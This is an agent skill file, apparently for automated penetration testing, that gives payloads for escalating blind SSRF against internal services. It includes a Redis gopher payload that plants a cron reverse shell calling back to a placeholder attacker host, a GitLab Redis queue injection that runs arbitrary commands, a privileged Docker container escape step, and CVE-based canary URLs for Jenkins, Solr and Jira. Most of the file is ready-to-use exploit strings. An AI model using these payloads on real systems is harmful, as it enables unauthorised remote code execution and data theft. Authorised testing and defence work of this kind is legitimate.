---
name: blind-ssrf-chains
description: Service-specific SSRF escalation payloads and canary techniques. Use when blind SSRF is confirmed to escalate impact via internal services (Redis, Elasticsearch, Docker, Jenkins, Consul, Solr, Jira, GitLab).
---

# Blind SSRF Chains

Escalate blind SSRF to RCE/data exfil by targeting internal services that make secondary outbound requests or accept destructive commands.

## When to Use

- Blind SSRF confirmed (can hit internal IPs, no response body)
- Need to prove impact beyond "I can reach internal hosts"
- Internal service fingerprinting via response timing/size differentials

## When NOT to Use

- Full SSRF with response body (read response directly instead)
- No confirmed SSRF yet (use ssrf-ip-filter-bypass or ssrf-redirect-loop first)

## SSRF Canary Concept

Chain: `attacker -> SSRF -> internal service -> outbound request -> OOB callback`

Services that make outbound requests when hit via SSRF: Confluence, Jira, Jenkins, Solr, Weblogic, Hystrix Dashboard, W3 Total Cache. Hit them internally, they fetch your callback URL, confirming exploitation.

**Checkpoint:** Before attempting payloads, confirm blind SSRF with a canary: `?url=http://YOUR-OOB-SERVER/ssrf-test`. If no callback received, the SSRF may not be server-side.

## Fingerprinting (Blind)

| Signal | Technique |
|--------|-----------|
| Status code delta | Live service returns 200; dead port returns 500/timeout |
| Response size delta | Compare byte count of hit vs miss |
| Timing delta | Connected ports respond faster than filtered |
| Error oracle | Distinct error strings reveal service presence |

## Service Payloads

### Elasticsearch (9200)
```
/_cluster/health
/_cat/indices
```

### Redis (6379) -- via Gopher to Cron RCE
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/ATTACKER/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Docker (2375/2376)
```
/containers/json
/secrets
/services
```
RCE: `POST /containers/create` with privileged alpine + host bind mount.

### Jenkins (8080/8888)
Canary: `/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://CANARY/%23&login=a&password=b`

### Solr (8983)
Canary via shards: `/search?q=Apple&shards=http://CANARY/solr/collection/config%23`

### Jira/Confluence
CVE-2017-9506: `/plugins/servlet/oauth/users/icon-uri?consumerUri=http://CANARY`
CVE-2019-8451: `/plugins/servlet/gadgets/makeRequest?url=https://CANARY:443@example.com`

### GitLab -- via Redis (6379)
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0D%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22{"class":"GitlabShellWorker","args":["class_eval","open('|CMD').read"]}%22%0D%0A%20exec%0D%0A/ssrf.git
```

## Tools

- **Gopherus** -- generates gopher payloads for MySQL, PostgreSQL, FastCGI, Redis, Memcache
- **surf** -- `surf -l hosts.txt` to find internal-only IPs reachable via SSRF

## Chain With

- **ssrf-ip-filter-bypass** -- bypass IP filters to reach internal services
- **ssrf-redirect-loop** -- upgrade blind to visible via redirect chains
- **OOB callbacks** -- register canary URLs for outbound request confirmation
- **surf** -- identify which internal hosts are viable SSRF targets
